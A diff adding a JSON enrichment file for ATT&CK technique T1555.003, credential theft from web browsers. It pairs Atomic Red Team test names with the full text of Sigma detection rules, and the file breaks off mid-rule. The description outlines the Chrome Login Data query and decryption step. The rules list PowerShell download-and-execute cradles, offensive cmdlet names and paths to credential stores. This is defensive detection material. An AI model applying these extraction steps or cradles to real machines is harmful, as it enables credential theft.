@@ -1,0 +1,705 @@
+{
+    "id": "T1555.003",
+    "name": "Credentials from Web Browsers",
+    "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, `AppDataLocalGoogleChromeUser DataDefaultLogin Data` and executing a SQL query: `SELECT action_url, username_value, password_value FROM logins;`. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function `CryptUnprotectData`, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData April 2018)\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](T1555.004).\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "File: File Access, Command: Command Execution, Process: OS API Execution, Process: Process Access",
+    "detection": "Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: `AppDataLocalGoogleChromeUser DataDefaultLogin Data`. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).",
+    "url": "https://attack.mitre.org/techniques/T1555/003",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
+                "atomic_attack_name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
+                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "70422253-8198-4019-b617-6be401b49fce",
+                "atomic_attack_name": "Dump Chrome Login Data with esentutl",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Copying Sensitive Files with Credential Data",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml",
+                        "remote_content": "title: Copying Sensitive Files with Credential Data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nstatus: test\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2024-06-04\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\n    - car.2013-07-001\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_esent_img:\n        - Image|endswith: '\\esentutl.exe'\n        - OriginalFileName: '\\esentutl.exe'\n    selection_esent_cli:\n        CommandLine|contains|windash:\n            - 'vss'\n            - ' /m '\n            - ' /y '\n    selection_susp_paths:\n        CommandLine|contains:\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\security'\n            - '\\config\\RegBack\\system'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system '        # space needed to avoid false positives with \\config\\systemprofile\\\n            - '\\repair\\sam'\n            - '\\repair\\security'\n            - '\\repair\\system'\n            - '\\windows\\ntds\\ntds.dit'\n    condition: all of selection_esent_* or selection_susp_paths\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic investigator.\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "a6a5ec26-a2d1-4109-9d35-58b867689329",
+                "atomic_attack_name": "Simulating access to Windows Edge Login Data",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Browser Data Stealing",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml",
+                        "remote_content": "title: Potential Browser Data Stealing\nid: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\nrelated:\n    - id: fc028194-969d-4122-8abe-0470d5b8f12f\n      type: derived\nstatus: test\ndescription: |\n    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\n    Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\n    Web browsers typically store the credentials in an encrypted format within a credential store.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n              - 'copy-item'\n              - 'copy '\n              - 'cpi '\n              - ' cp '\n              - 'move '\n              - 'move-item'\n              - ' mi '\n              - ' mv '\n        - Image|endswith:\n              - '\\xcopy.exe'\n              - '\\robocopy.exe'\n        - OriginalFileName:\n              - 'XCOPY.EXE'\n              - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Amigo\\User Data'\n            - '\\BraveSoftware\\Brave-Browser\\User Data'\n            - '\\CentBrowser\\User Data'\n            - '\\Chromium\\User Data'\n            - '\\CocCoc\\Browser\\User Data'\n            - '\\Comodo\\Dragon\\User Data'\n            - '\\Elements Browser\\User Data'\n            - '\\Epic Privacy Browser\\User Data'\n            - '\\Google\\Chrome Beta\\User Data'\n            - '\\Google\\Chrome SxS\\User Data'\n            - '\\Google\\Chrome\\User Data\\'\n            - '\\Kometa\\User Data'\n            - '\\Maxthon5\\Users'\n            - '\\Microsoft\\Edge\\User Data'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Nichrome\\User Data'\n            - '\\Opera Software\\Opera GX Stable\\'\n            - '\\Opera Software\\Opera Neon\\User Data'\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Orbitum\\User Data'\n            - '\\QIP Surf\\User Data'\n            - '\\Sputnik\\User Data'\n            - '\\Torch\\User Data'\n            - '\\uCozMedia\\Uran\\User Data'\n            - '\\Vivaldi\\User Data'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
+                "atomic_attack_name": "Simulating access to Windows Firefox Login Data",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Browser Data Stealing",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml",
+                        "remote_content": "title: Potential Browser Data Stealing\nid: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\nrelated:\n    - id: fc028194-969d-4122-8abe-0470d5b8f12f\n      type: derived\nstatus: test\ndescription: |\n    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\n    Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\n    Web browsers typically store the credentials in an encrypted format within a credential store.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n              - 'copy-item'\n              - 'copy '\n              - 'cpi '\n              - ' cp '\n              - 'move '\n              - 'move-item'\n              - ' 